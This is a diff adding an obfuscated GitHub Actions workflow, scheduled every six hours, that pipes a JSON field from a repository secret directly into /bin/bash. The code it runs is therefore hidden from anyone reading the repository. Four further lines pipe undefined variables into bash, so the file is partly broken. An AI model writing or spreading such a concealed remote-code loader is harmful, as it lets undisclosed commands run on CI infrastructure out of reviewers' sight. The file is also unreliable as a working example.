@@ -1,0 +1,23 @@
+name: minguangshengjun
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: minguangshengjun
+        env:
+          fnh00: ${{ secrets.fnh00 }}
+        run: |
+          echo $fnh00 | jq -r .ypgj37 | /bin/bash
+          echo $pcdrg85 | jq -r .mbsbp131 | /bin/bash
+          echo $htcn9 | jq -r .fdg91 | /bin/bash
+          echo $o4 | jq -r .a1 | /bin/bash
+          echo $hn63644 | jq -r .bz34 | /bin/bash
+
